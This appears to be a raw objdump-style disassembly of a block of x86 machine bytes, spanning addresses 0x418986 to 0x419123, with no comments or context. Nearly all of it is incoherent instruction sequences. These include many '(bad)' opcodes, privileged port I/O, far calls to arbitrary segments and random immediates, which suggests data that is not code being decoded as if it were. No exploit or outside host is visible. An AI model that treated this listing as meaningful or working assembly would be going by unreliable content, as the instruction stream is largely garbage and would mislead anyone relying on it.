  418986:	xor    eax,0x834e73df
  41898b:	push   es
  41898c:	je     0x418992
  41898e:	pop    esp
  41898f:	jns    0x41899a
  418991:	int3   
  418992:	push   ss
  418993:	jns    0x418927
  418995:	in     al,dx
  418996:	and    edi,DWORD PTR [ecx-0x5d2fd370]
  41899c:	dec    esp
  41899d:	sbb    cl,BYTE PTR [edi-0x50]
  4189a0:	in     al,0xa0
  4189a2:	jnp    0x4189eb
  4189a4:	xchg   esp,eax
  4189a5:	out    dx,eax
  4189a6:	jg     0x41895e
  4189a8:	aas    
  4189a9:	ja     0x4189e9
  4189ab:	idiv   BYTE PTR [edi+ebx*2+0x44]
  4189af:	std    
  4189b0:	add    edx,DWORD PTR [eax-0x151605ed]
  4189b6:	xchg   ebp,eax
  4189b7:	inc    ecx
  4189b8:	cmp    eax,0x948f309f
  4189bd:	lea    ebp,[esi-0x73]
  4189c0:	cdq    
  4189c1:	test   eax,0x4be0ce7c
  4189c6:	jg     0x4189e1
  4189c8:	inc    ebp
  4189c9:	test   ah,bl
  4189cb:	jg     0x41899e
  4189cd:	imul   eax,DWORD PTR [ecx-0x3f],0x250e6307
  4189d4:	test   DWORD PTR [eax-0x311a95a3],edx
  4189da:	mov    cl,BYTE PTR fs:[eax]
  4189dd:	out    0xa1,eax
  4189df:	mov    al,BYTE PTR [eax]
  4189e1:	in     eax,dx
  4189e2:	call   0x1a6:0x1104e526
  4189e9:	xlat   BYTE PTR ds:[ebx]
  4189ea:	or     esi,0xdaaf6414
  4189f0:	repz rcl esi,0x77
  4189f4:	sub    eax,0x3aa1365a
  4189f9:	xor    dl,BYTE PTR [ebx-0xedb1f08]
  4189ff:	arpl   WORD PTR [edx+eiz*4],bp
  418a02:	dec    esp
  418a03:	and    bl,BYTE PTR ss:[esi-0x9]
  418a07:	push   es
  418a08:	je     0x418a2a
  418a0a:	fcomi  st,st(4)
  418a0c:	or     eax,0xfb0b7683
  418a11:	clc    
  418a12:	repnz push edx
  418a14:	and    BYTE PTR [esi],dl
  418a16:	pop    ebx
  418a17:	jae    0x4189be
  418a19:	xor    esp,edi
  418a1b:	cmp    edi,DWORD PTR [edi]
  418a1d:	sbb    BYTE PTR [eax],0xb7
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	sub    dh,BYTE PTR [edi]
  418a40:	repz push eax
  418a42:	cmp    DWORD PTR [edi],ebx
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	push   esi
  418a4b:	pop    edx
  418a4c:	daa    
  418a4d:	mov    al,0x5a
  418a4f:	jbe    0x418a02
  418a51:	xchg   BYTE PTR [ebx],ah
  418a53:	cmp    al,0xa1
  418a55:	adc    DWORD PTR [eax-0x50],edi
  418a58:	call   0xf4214345
  418a5d:	daa    
  418a5e:	std    
  418a5f:	je     0x418ac5
  418a61:	in     eax,0x2a
  418a63:	stos   DWORD PTR es:[edi],eax
  418a64:	fsub   QWORD PTR [ecx+0x10]
  418a67:	les    esp,FWORD PTR ds:0xe849afe0
  418a6d:	xchg   ecx,eax
  418a6e:	xor    cl,BYTE PTR [ebp+0xe9474ca]
  418a74:	psadbw mm3,mm7
  418a77:	mov    ebp,0x63899896
  418a7c:	xchg   ch,al
  418a7e:	jnp    0x418a7a
  418a80:	xor    eax,0x38aeb677
  418a85:	cmp    ah,BYTE PTR [ebp+0x8]
  418a88:	push   0xa6014d70
  418a8d:	sbb    BYTE PTR [ebx-0x1c03ad99],0x73
  418a94:	mov    ebp,0xb4d73507
  418a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a9a:	daa    
  418a9b:	mov    edx,0x2def016e
  418aa0:	cmp    al,0x81
  418aa2:	cmp    edi,esi
  418aa4:	dec    eax
  418aa5:	cli    
  418aa6:	jbe    0x418a76
  418aa8:	jmp    0xced36f5b
  418aad:	cdq    
  418aae:	add    BYTE PTR [edi-0x7571df3e],0x7d
  418ab5:	sti    
  418ab6:	inc    esp
  418ab7:	mov    ah,0x67
  418ab9:	mov    dh,0xa1
  418abb:	mov    bh,0xd6
  418abd:	in     eax,0xe5
  418abf:	adc    BYTE PTR [edx+0x9],bh
  418ac2:	sub    dh,BYTE PTR [eax]
  418ac4:	ins    BYTE PTR es:[edi],dx
  418ac5:	clc    
  418ac6:	jo     0x418ad4
  418ac8:	pop    edx
  418ac9:	mov    ah,0xd8
  418acb:	nop
  418acc:	mov    DWORD PTR [edi+0x5f],ebx
  418acf:	and    edi,DWORD PTR [edx+0x64]
  418ad2:	out    dx,eax
  418ad3:	xor    BYTE PTR [ebp+0x28],0x6c
  418ad7:	bound  eax,QWORD PTR [esi+edx*2-0x40ee3f5f]
  418ade:	dec    esi
  418adf:	fild   WORD PTR [esi]
  418ae1:	jne    0x418aa2
  418ae3:	push   cs
  418ae4:	ins    BYTE PTR es:[edi],dx
  418ae5:	pop    es
  418ae6:	test   bh,ch
  418ae8:	or     eax,0xd9f34980
  418aed:	mov    ah,0x9a
  418aef:	push   ecx
  418af0:	fistp  DWORD PTR [ecx+0x6727acff]
  418af6:	test   BYTE PTR [ebp+0x72],al
  418af9:	inc    ebp
  418afa:	adc    al,0x50
  418afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418afd:	xor    eax,0x8dc0e623
  418b02:	jmp    0x3cc2:0xcb534533
  418b09:	inc    ecx
  418b0a:	push   cs
  418b0b:	sub    DWORD PTR [ebp-0x26],eax
  418b0e:	fisttp WORD PTR [ecx+0x715736b9]
  418b14:	nop
  418b15:	mov    DWORD PTR [ecx],esi
  418b17:	jns    0x418ab9
  418b19:	sbb    al,0x18
  418b1b:	aad    0xdf
  418b1d:	rep ins DWORD PTR es:[edi],dx
  418b1f:	adc    al,0xbd
  418b21:	xchg   edi,eax
  418b22:	mov    bh,0xf3
  418b24:	pop    ss
  418b25:	mov    cl,bl
  418b27:	mov    eax,0x4b3bcbd2
  418b2c:	rcr    DWORD PTR [ebx+0x9a68408],cl
  418b32:	enter  0x9109,0xc9
  418b36:	xchg   ebp,eax
  418b37:	xor    BYTE PTR [esi-0x4a8662a1],bh
  418b3d:	or     eax,0x9dad2ab9
  418b42:	dec    ebx
  418b43:	in     al,dx
  418b44:	or     BYTE PTR [ebp+edx*1+0x55],0xff
  418b49:	aas    
  418b4a:	jo     0x418aff
  418b4c:	sbb    al,0xa0
  418b4e:	push   esp
  418b4f:	inc    edx
  418b50:	repnz es mov bl,0xb8
  418b54:	mov    bl,0xe
  418b56:	repz loope 0x418bbf
  418b59:	push   ecx
  418b5a:	jns    0x418b3a
  418b5c:	xchg   ebp,eax
  418b5d:	dec    esi
  418b5e:	lea    eax,[ecx]
  418b60:	test   DWORD PTR [ebx],0xdc4b8cfb
  418b66:	add    eax,0xaa4de351
  418b6b:	sub    ah,BYTE PTR [ebp+0xc]
  418b6e:	pop    ecx
  418b6f:	ja     0x418bc0
  418b71:	cmp    al,dh
  418b73:	sub    eax,0x55abedbc
  418b78:	scas   al,BYTE PTR es:[edi]
  418b79:	retf   0x8ec8
  418b7c:	mov    ecx,ebx
  418b7e:	add    al,0x19
  418b80:	int3   
  418b81:	pop    edx
  418b82:	xor    bl,BYTE PTR [eax-0x46]
  418b85:	ror    ebx,cl
  418b87:	out    0x86,eax
  418b89:	xchg   ebp,eax
  418b8a:	xor    dh,BYTE PTR [eax+0x5ad01872]
  418b90:	pop    ss
  418b91:	call   0xb205:0xb052bd73
  418b98:	mov    ebx,DWORD PTR [edx+0x77]
  418b9b:	add    bl,BYTE PTR [edi]
  418b9d:	test   DWORD PTR [eax-0x1b3ded69],ebp
  418ba3:	fild   WORD PTR [edi]
  418ba5:	(bad)  
  418ba6:	xchg   ebx,eax
  418ba7:	add    al,0x5b
  418ba9:	outs   dx,DWORD PTR ds:[esi]
  418baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bab:	adc    bl,BYTE PTR [edi+0x399ef11e]
  418bb1:	ja     0x418b7a
  418bb3:	fcom   QWORD PTR [edx-0x51]
  418bb6:	pop    ebx
  418bb7:	hlt    
  418bb8:	les    edi,FWORD PTR [edx-0x28]
  418bbb:	fidiv  WORD PTR [edi-0x5d1c1110]
  418bc1:	out    dx,eax
  418bc2:	ror    BYTE PTR [ecx-0x781fc4e3],cl
  418bc8:	ins    DWORD PTR es:[edi],dx
  418bc9:	cmp    ah,BYTE PTR [eax+0x282749b8]
  418bcf:	pop    edx
  418bd0:	pushf  
  418bd1:	enter  0x286e,0x83
  418bd5:	inc    esp
  418bd6:	add    eax,0xb519804a
  418bdb:	adc    al,0xf5
  418bdd:	test   al,0xac
  418bdf:	idiv   BYTE PTR [edi-0x2a]
  418be2:	inc    esp
  418be3:	dec    esp
  418be4:	sti    
  418be5:	mov    WORD PTR [eax+0x9],ds
  418be8:	lahf   
  418be9:	mov    al,0x55
  418beb:	cdq    
  418bec:	xchg   ecx,eax
  418bed:	sbb    BYTE PTR [ecx+0x64b705e2],bl
  418bf3:	inc    edi
  418bf4:	(bad)  
  418bf5:	jnp    0x418b90
  418bf7:	mov    edi,0x2d8e1800
  418bfc:	or     ebp,DWORD PTR [edi-0x52]
  418bff:	adc    eax,0x332de618
  418c04:	push   eax
  418c05:	xor    DWORD PTR [ecx-0x5c],esp
  418c08:	test   DWORD PTR [edx],esp
  418c0a:	inc    edi
  418c0b:	mov    esi,0xe1516434
  418c10:	cdq    
  418c11:	inc    eax
  418c12:	fwait
  418c13:	mov    ds:0xc36c000d,eax
  418c18:	retf   
  418c19:	mov    esp,DWORD PTR [edi-0x69f31ca1]
  418c1f:	sbb    eax,0x1f987020
  418c24:	stos   BYTE PTR es:[edi],al
  418c25:	(bad)
  418c2a:	mov    ebx,0x5983cdd5
  418c2f:	out    dx,eax
  418c30:	rcr    BYTE PTR [eax+0x7091f070],cl
  418c36:	pop    ebp
  418c37:	push   ds
  418c38:	add    eax,0x82e45eb8
  418c3d:	push   esi
  418c3e:	sbb    eax,0xb7a680b1
  418c43:	sub    bl,BYTE PTR [ebx-0x4967b0c2]
  418c49:	ret    0x172e
  418c4c:	(bad)
  418c50:	push   ebp
  418c51:	fs xor BYTE PTR gs:[ecx+0x23ed1d6a],0x45
  418c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c5b:	call   0xdd90:0xed166260
  418c62:	sbb    eax,DWORD PTR [esi]
  418c64:	imul   edi,DWORD PTR [esi-0x43],0x4b4c097c
  418c6b:	xor    al,0xad
  418c6d:	mov    bl,0x6f
  418c6f:	cmovnp eax,edx
  418c72:	stos   BYTE PTR es:[edi],al
  418c73:	pop    edx
  418c74:	push   ecx
  418c75:	jg     0x418ccb
  418c77:	and    DWORD PTR [eax+ecx*2],ebp
  418c7a:	test   DWORD PTR [ebx],0x573dfd69
  418c80:	pop    edx
  418c81:	xchg   edi,ecx
  418c83:	fisubr WORD PTR [ecx+ebp*8]
  418c86:	mov    cl,0x35
  418c88:	pop    es
  418c89:	es pop edi
  418c8b:	adc    BYTE PTR [esi+0x74e862cc],al
  418c91:	xor    eax,0x9afee9ad
  418c96:	adc    DWORD PTR [edi+0x14],0x6dace533
  418c9d:	xor    BYTE PTR [edx+0x4b8c5dbf],ch
  418ca3:	pop    ds
  418ca4:	imul   BYTE PTR [edx+ecx*4]
  418ca7:	sbb    cl,al
  418ca9:	xchg   esp,eax
  418caa:	cmp    cl,BYTE PTR [ebp-0xafe9647]
  418cb0:	or     BYTE PTR ds:0x5c8f3e84,al
  418cb6:	stos   DWORD PTR es:[edi],eax
  418cb7:	jge    0x418cc0
  418cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cba:	push   esp
  418cbb:	pushf  
  418cbc:	(bad)  
  418cbd:	xor    al,0xf8
  418cbf:	bound  ecx,QWORD PTR [edi+0x12565d4c]
  418cc5:	push   0x694c9bdd
  418cca:	data16 jl 0x418cff
  418ccd:	mov    WORD PTR [edi+0x33],?
  418cd0:	int    0x49
  418cd2:	inc    ebx
  418cd3:	rcl    DWORD PTR [edx+ebx*4-0x3a],1
  418cd7:	inc    esp
  418cd8:	dec    edi
  418cd9:	cmp    DWORD PTR [edx+0x222e820c],0x17
  418ce0:	ror    BYTE PTR [edi],1
  418ce2:	or     DWORD PTR [edi+0xa],ebp
  418ce5:	and    cl,BYTE PTR [esi+0x2b]
  418ce8:	jmp    0x418d0e
  418cea:	inc    ecx
  418ceb:	sub    eax,0x1c16cb65
  418cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cf1:	imul   eax,DWORD PTR [ecx],0xffffffba
  418cf4:	mov    bl,0xe2
  418cf6:	ffree  st(4)
  418cf8:	in     al,0x78
  418cfa:	fbld   TBYTE PTR ds:0x2c2dfdc5
  418d00:	add    dh,BYTE PTR [ecx+0x48edc4fa]
  418d06:	aaa    
  418d07:	int    0x24
  418d09:	xchg   ecx,eax
  418d0a:	loope  0x418d7a
  418d0c:	jbe    0x418cad
  418d0e:	aas    
  418d0f:	retf   
  418d10:	sbb    BYTE PTR [ebx],dh
  418d12:	add    ch,BYTE PTR [ebp+0x723d36f1]
  418d18:	or     al,0x45
  418d1a:	repnz iret 
  418d1c:	push   ecx
  418d1d:	push   ds
  418d1e:	mov    ecx,0x262c266f
  418d23:	add    ebx,DWORD PTR [ebp-0x4e]
  418d26:	lods   eax,DWORD PTR ds:[esi]
  418d27:	test   eax,0x7038fcec
  418d2c:	sbb    ch,dh
  418d2e:	mov    dh,0x31
  418d30:	(bad)  
  418d31:	repnz lods eax,DWORD PTR ds:[esi]
  418d33:	xor    DWORD PTR [eax-0x66267179],esp
  418d39:	outs   dx,BYTE PTR ds:[esi]
  418d3a:	scas   al,BYTE PTR es:[edi]
  418d3b:	jmp    0x8bce:0xd326609
  418d42:	fstp   DWORD PTR [ebx-0xc4587ab]
  418d48:	jo     0x418dbd
  418d4a:	mov    ds:0x6f8edafa,al
  418d4f:	sbb    eax,0x33c3b5e8
  418d54:	clc    
  418d55:	adc    DWORD PTR [ebp+0x61e247a3],edi
  418d5b:	xchg   edi,eax
  418d5c:	outs   dx,DWORD PTR ds:[esi]
  418d5d:	inc    ebp
  418d5e:	jb     0x418d30
  418d60:	fucomp st(4)
  418d62:	push   esi
  418d63:	sub    dl,0x1
  418d66:	daa    
  418d67:	adc    eax,0x91b15bf7
  418d6c:	push   ebx
  418d6d:	or     eax,0x2d9e8f43
  418d72:	inc    ebx
  418d73:	shr    DWORD PTR [eax-0x5118bfc5],cl
  418d79:	fnstsw WORD PTR [edi+0x49]
  418d7c:	enter  0xa4f1,0x62
  418d80:	cmp    al,0x59
  418d82:	jp     0x418d0c
  418d84:	add    ecx,DWORD PTR [esi+0x26]
  418d87:	sub    DWORD PTR [esi+0x537b0a10],eax
  418d8d:	push   es
  418d8e:	(bad)  
  418d8f:	and    BYTE PTR [edi],bh
  418d91:	xchg   ebx,eax
  418d92:	push   ebp
  418d93:	or     DWORD PTR [esi-0x75493332],0xffffffdb
  418d9a:	and    eax,0x16ae2080
  418d9f:	dec    esp
  418da0:	sub    al,0x75
  418da2:	call   0x792c:0xa225a74e
  418da9:	hlt    
  418daa:	test   eax,0x93b277a7
  418daf:	lods   eax,DWORD PTR ds:[esi]
  418db0:	cmp    bh,BYTE PTR [edi]
  418db2:	pop    edi
  418db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db4:	sbb    al,0xef
  418db6:	outs   dx,BYTE PTR ds:[esi]
  418db7:	adc    DWORD PTR [eax+0x566fa2fe],0xc167201
  418dc1:	jmp    0x991992db
  418dc6:	pop    edi
  418dc7:	mov    edi,0x1cb6714d
  418dcc:	dec    ecx
  418dcd:	add    cl,BYTE PTR [ecx-0x36502c5c]
  418dd3:	es push cs
  418dd5:	jne    0x418e50
  418dd7:	xor    esi,ebx
  418dd9:	lods   al,BYTE PTR ds:[esi]
  418dda:	pop    edi
  418ddb:	push   edi
  418ddc:	arpl   di,dx
  418dde:	int    0x43
  418de0:	pop    ecx
  418de1:	cdq    
  418de2:	dec    ah
  418de4:	dec    ebx
  418de5:	mov    al,0xa3
  418de7:	mov    ecx,0xe5d88c53
  418dec:	aam    0x43
  418dee:	in     al,0x4d
  418df0:	(bad)  
  418df1:	mov    ebx,0x76991229
  418df6:	mov    WORD PTR [edi+0x35f850ee],fs
  418dfc:	ror    DWORD PTR [eax-0x13127ff0],1
  418e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e03:	jbe    0x418e4d
  418e05:	ror    BYTE PTR [ebp-0x48],1
  418e08:	ins    BYTE PTR es:[edi],dx
  418e09:	test   al,0xab
  418e0b:	dec    esi
  418e0c:	mov    cl,0xad
  418e0e:	cmp    DWORD PTR [ecx],esi
  418e10:	mov    bl,0xfb
  418e12:	sar    BYTE PTR ds:0xc8288752,0xf4
  418e19:	dec    edx
  418e1a:	retf   0x2fa1
  418e1d:	scas   al,BYTE PTR es:[edi]
  418e1e:	retf   0xd1a8
  418e21:	lods   eax,DWORD PTR ds:[esi]
  418e22:	leave  
  418e23:	mul    DWORD PTR [eax+0x4336320]
  418e29:	das    
  418e2a:	adc    DWORD PTR [ebp-0x77ed3fc5],ecx
  418e30:	mov    dh,0xab
  418e32:	div    ch
  418e34:	imul   edx,DWORD PTR [ebx],0x5392f1a
  418e3a:	dec    eax
  418e3b:	jecxz  0x418dc9
  418e3d:	inc    ecx
  418e3e:	nop
  418e3f:	lds    ebx,FWORD PTR [edx]
  418e41:	sbb    ebp,DWORD PTR [edi+0x18]
  418e44:	cld    
  418e45:	aaa    
  418e46:	dec    edx
  418e47:	pop    esp
  418e48:	pop    ss
  418e49:	sahf   
  418e4a:	mov    esp,0x69d25674
  418e4f:	inc    edi
  418e50:	jae    0x418dd5
  418e52:	pop    es
  418e53:	fwait
  418e54:	fwait
  418e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e56:	test   BYTE PTR [edi+0x613ed17a],0xfd
  418e5d:	rcr    ecx,0x43
  418e60:	(bad)  
  418e61:	out    0x74,al
  418e63:	lock or eax,0xcd194f17
  418e69:	or     eax,0x770389a7
  418e6e:	scas   al,BYTE PTR es:[edi]
  418e6f:	inc    ecx
  418e70:	jnp    0x418e88
  418e72:	outs   dx,DWORD PTR ds:[esi]
  418e73:	and    esp,0x6c
  418e76:	xchg   ebx,eax
  418e77:	or     DWORD PTR [ebp+0x6c],esi
  418e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e7b:	f2xm1  
  418e7d:	xchg   ecx,eax
  418e7e:	pop    esp
  418e7f:	xor    edi,ebx
  418e81:	aas    
  418e82:	push   ds
  418e83:	mov    DWORD PTR [ebx-0x2e94837a],ecx
  418e89:	dec    edx
  418e8a:	lods   eax,DWORD PTR ds:[esi]
  418e8b:	into   
  418e8c:	xchg   BYTE PTR [edx-0x4b],bh
  418e8f:	out    0x40,eax
  418e91:	add    BYTE PTR [edx+0x68c4d990],bl
  418e97:	(bad)  
  418e98:	adc    eax,0xd3cc391f
  418e9d:	dec    edi
  418e9e:	pop    ebx
  418e9f:	scas   al,BYTE PTR es:[edi]
  418ea0:	push   ebx
  418ea1:	std    
  418ea2:	out    dx,al
  418ea3:	enter  0xb9f8,0xef
  418ea7:	or     DWORD PTR [ecx],edx
  418ea9:	pop    edi
  418eaa:	js     0x418f15
  418eac:	sbb    ah,BYTE PTR [ecx]
  418eae:	jne    0x418e3c
  418eb0:	int    0xec
  418eb2:	gs mov al,0x9a
  418eb5:	out    dx,eax
  418eb6:	std    
  418eb7:	sbb    eax,0x7307c093
  418ebc:	cld    
  418ebd:	stos   DWORD PTR es:[edi],eax
  418ebe:	push   edi
  418ebf:	retf   0x1996
  418ec2:	jb     0x418e87
  418ec4:	adc    al,0x47
  418ec6:	push   ecx
  418ec7:	cmp    ebx,eax
  418ec9:	inc    esi
  418eca:	or     BYTE PTR [ebx],ch
  418ecc:	pusha  
  418ecd:	pop    ds
  418ece:	outs   dx,BYTE PTR ds:[esi]
  418ecf:	dec    ebp
  418ed0:	retf   0x5efe
  418ed3:	pop    ebp
  418ed4:	or     DWORD PTR [esi],eax
  418ed6:	and    edx,DWORD PTR [ecx+0x2c]
  418ed9:	sbb    ah,BYTE PTR [esi+0x7f]
  418edc:	mov    al,0x2b
  418ede:	ret    
  418edf:	test   DWORD PTR [edi+0x34f44c84],ecx
  418ee5:	mov    dh,0x5d
  418ee7:	xchg   ebx,eax
  418ee8:	enter  0xb83,0x68
  418eec:	cmp    edi,ebp
  418eee:	pop    eax
  418eef:	stos   BYTE PTR es:[edi],al
  418ef0:	out    0xe8,eax
  418ef2:	test   esp,esi
  418ef4:	and    DWORD PTR [esi],edi
  418ef6:	call   0x6149ce98
  418efb:	(bad)
  418eff:	inc    eax
  418f00:	into   
  418f01:	outs   dx,BYTE PTR ds:[esi]
  418f02:	popf   
  418f03:	test   DWORD PTR [edx+0x735bb100],edx
  418f09:	ins    DWORD PTR es:[edi],dx
  418f0a:	test   edi,0x99237153
  418f10:	retf   0xb90c
  418f13:	pop    ds
  418f14:	or     eax,0x4f01f879
  418f19:	enter  0xce48,0x70
  418f1d:	cmp    eax,0x1d864c5c
  418f22:	daa    
  418f23:	sahf   
  418f24:	mov    ecx,DWORD PTR [eax]
  418f26:	sub    DWORD PTR [esi+0x4d754813],esp
  418f2c:	je     0x418f5a
  418f2e:	dec    ebp
  418f2f:	dec    edi
  418f30:	lods   eax,DWORD PTR ds:[esi]
  418f31:	std    
  418f32:	xchg   edi,eax
  418f33:	mov    esi,0xce502cfb
  418f38:	jno    0x418f6f
  418f3a:	adc    al,0xbc
  418f3c:	add    edi,DWORD PTR [esi+0x7e5d9aa2]
  418f42:	gs je  0x418f5d
  418f45:	cmp    BYTE PTR [esi],al
  418f47:	aad    0x21
  418f49:	dec    esi
  418f4a:	xor    DWORD PTR [esi-0x2d],edi
  418f4d:	les    esp,FWORD PTR [edi+0x7a]
  418f50:	push   ss
  418f51:	retf   0xa093
  418f54:	cdq    
  418f55:	adc    ecx,DWORD PTR [ebp+0x9]
  418f58:	pop    edi
  418f59:	mov    fs,WORD PTR [ebx+0x3e681754]
  418f5f:	or     eax,0x168d86d5
  418f64:	cmp    edx,DWORD PTR [eax+0x5dfb20f6]
  418f6a:	jg     0x418f41
  418f6c:	mov    bh,0x9e
  418f6e:	pop    edi
  418f6f:	das    
  418f70:	mov    ah,0xc4
  418f72:	sbb    eax,0xf6fb9b24
  418f77:	loop   0x418f53
  418f79:	and    DWORD PTR [esi-0x63],0xd1dab9d4
  418f80:	std    
  418f81:	jae    0x418f44
  418f83:	push   ebx
  418f84:	add    BYTE PTR [esp+ebp*8-0x48],dh
  418f88:	inc    esp
  418f89:	mov    eax,es:0x832bb77d
  418f8f:	dec    ebp
  418f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f91:	sub    ebx,ebp
  418f93:	pop    eax
  418f94:	aam    0xe1
  418f96:	push   ebx
  418f97:	sub    dh,bh
  418f99:	imul   BYTE PTR [esi+0x418c345b]
  418f9f:	(bad)  
  418fa0:	popa   
  418fa1:	xor    eax,0xf7db76ec
  418fa6:	sub    esi,DWORD PTR [esp+eax*4+0x67467243]
  418fad:	inc    edx
  418fae:	mov    dh,0x2d
  418fb0:	push   edi
  418fb1:	enter  0x76e6,0x79
  418fb5:	lods   al,BYTE PTR ds:[esi]
  418fb6:	add    BYTE PTR [ecx+0x3d48547],bl
  418fbc:	or     eax,0x93d4c626
  418fc1:	lods   eax,DWORD PTR ds:[esi]
  418fc2:	xchg   BYTE PTR [ebx],ah
  418fc4:	jne    0x418f7b
  418fc6:	xchg   edx,eax
  418fc7:	mov    cl,0x67
  418fc9:	imul   ebx,DWORD PTR [edi+0x32],0xa6288031
  418fd0:	repnz xlat BYTE PTR ds:[ebx]
  418fd2:	push   esi
  418fd3:	adc    cl,ch
  418fd5:	xlat   BYTE PTR ds:[ebx]
  418fd6:	(bad)  
  418fd7:	jge    0x418fa2
  418fd9:	out    dx,al
  418fda:	inc    esp
  418fdb:	jno    0x419040
  418fdd:	ins    DWORD PTR es:[edi],dx
  418fde:	mov    eax,0xfd9b21d2
  418fe3:	scas   al,BYTE PTR es:[edi]
  418fe4:	scas   al,BYTE PTR es:[edi]
  418fe5:	cmp    esp,DWORD PTR [ebp-0x4cbabef2]
  418feb:	pop    ss
  418fec:	sub    ch,BYTE PTR [eax-0x1f]
  418fef:	aad    0x85
  418ff1:	arpl   WORD PTR [edx-0x69],ax
  418ff4:	cdq    
  418ff5:	fiadd  WORD PTR [eax]
  418ff7:	fcmovb st,st(6)
  418ff9:	dec    ecx
  418ffa:	xor    al,BYTE PTR [eax]
  418ffc:	daa    
  418ffd:	shl    bh,cl
  418fff:	div    edi
  419001:	dec    ecx
  419002:	cmp    al,0xf7
  419004:	mov    edi,DWORD PTR [edx-0x11]
  419007:	scas   eax,DWORD PTR es:[edi]
  419008:	retf   
  419009:	sub    ah,bl
  41900b:	xor    al,0x9b
  41900d:	cwde   
  41900e:	lea    edx,[ebp+0x37]
  419011:	pop    edi
  419012:	pop    ds
  419013:	push   esi
  419014:	sub    BYTE PTR [ebp-0x27],0xa
  419018:	and    BYTE PTR [ebx-0x1430a346],dl
  41901e:	sub    ax,0x9a16
  419022:	icebp  
  419023:	push   ss
  419024:	sub    BYTE PTR [ecx],ch
  419026:	push   ss
  419027:	cld    
  419028:	push   ebp
  419029:	loop   0x41902d
  41902b:	lea    ebp,[edx+0x35]
  41902e:	mov    BYTE PTR [edi-0x16],bl
  419031:	mov    ds:0x528a031f,eax
  419036:	pop    edx
  419037:	(bad)  
  419038:	enter  0x6c91,0xbb
  41903c:	adc    bh,al
  41903e:	popf   
  41903f:	imul   esp,DWORD PTR [ebx-0x15dfa9e8],0xfffffffd
  419046:	sub    esi,esi
  419048:	push   esi
  419049:	pop    esi
  41904a:	jp     0x4190cb
  41904c:	call   0x3d1dd04d
  419051:	lahf   
  419052:	lods   al,BYTE PTR ds:[esi]
  419053:	daa    
  419054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419055:	pop    ebp
  419056:	adc    ecx,DWORD PTR [ecx-0x34872676]
  41905c:	lods   al,BYTE PTR ds:[esi]
  41905d:	sub    dl,dh
  41905f:	xchg   ebp,eax
  419060:	popa   
  419061:	lds    ebx,FWORD PTR [esi+0x15c0d64b]
  419067:	mov    edi,DWORD PTR [eax]
  419069:	jge    0x419071
  41906b:	or     ecx,0xd0f422d7
  419071:	add    edx,DWORD PTR [ebx+0x3e4c9880]
  419077:	xor    BYTE PTR [edx-0x48],0x15
  41907b:	and    edx,DWORD PTR [eax]
  41907d:	mov    esi,0x6e715e88
  419082:	dec    eax
  419083:	das    
  419084:	mov    ch,0xde
  419086:	inc    ecx
  419087:	(bad)  
  419088:	mov    dh,0xf3
  41908a:	cmc    
  41908b:	imul   ebp,DWORD PTR [ebp+0x4d],0x4f42af3d
  419092:	xchg   eax,edi
  419094:	mov    WORD PTR fs:[esi-0x4f5c1bb5],ds
  41909b:	inc    ebx
  41909c:	sahf   
  41909d:	popa   
  41909e:	mov    eax,ds:0x72b563e7
  4190a3:	cld    
  4190a4:	dec    ebp
  4190a5:	inc    esi
  4190a6:	test   al,0xcb
  4190a8:	into   
  4190a9:	les    eax,FWORD PTR [ebx+eiz*1-0x7121474f]
  4190b0:	mov    dh,BYTE PTR [esi]
  4190b2:	xor    DWORD PTR [eax],ecx
  4190b4:	jo     0x419108
  4190b6:	add    ecx,DWORD PTR [edx]
  4190b8:	and    al,0x73
  4190ba:	jg     0x4190b8
  4190bc:	imul   ecx
  4190be:	jge    0x41906c
  4190c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190c1:	xchg   esp,eax
  4190c2:	mov    ds:0xffdf5083,al
  4190c7:	dec    edx
  4190c8:	push   ebp
  4190c9:	sbb    eax,0xf8550000
  4190ce:	loope  0x4190f1
  4190d0:	dec    ebx
  4190d1:	(bad)  
  4190d3:	mov    bh,0xf9
  4190d5:	xchg   BYTE PTR [ebx],cl
  4190d7:	xchg   ebx,eax
  4190d8:	cs push ecx
  4190da:	fiadd  WORD PTR [edi+0x5a]
  4190dd:	lds    ebx,FWORD PTR [ebx+0x58]
  4190e0:	into   
  4190e1:	sbb    esi,eax
  4190e3:	fstp   st(4)
  4190e5:	xchg   esp,eax
  4190e6:	push   esi
  4190e7:	pusha  
  4190e8:	jns    0x41915f
  4190ea:	je     0x419075
  4190ec:	mov    edx,0x5008e20a
  4190f1:	inc    ecx
  4190f2:	ficomp DWORD PTR ds:0xe63ccb79
  4190f8:	push   cs
  4190f9:	xor    BYTE PTR [edi+0x12],0xe5
  4190fd:	sub    bh,cl
  4190ff:	push   es
  419100:	stos   DWORD PTR es:[edi],eax
  419101:	sbb    bl,BYTE PTR [edi]
  419103:	scas   al,BYTE PTR es:[edi]
  419104:	mov    dh,0x2c
  419106:	dec    esp
  419107:	loopne 0x4190b6
  419109:	inc    esi
  41910a:	mov    edi,DWORD PTR [esi+0x20]
  41910d:	pop    ebp
  41910e:	and    ebx,edx
  419110:	fwait
  419111:	das    
  419112:	push   ebx
  419113:	in     al,0xfc
  419115:	jmp    FWORD PTR [edx-0x4cadcebd]
  41911b:	(bad)
  41911f:	pop    edi
  419120:	es adc al,0xdd
  419123:	sahf   
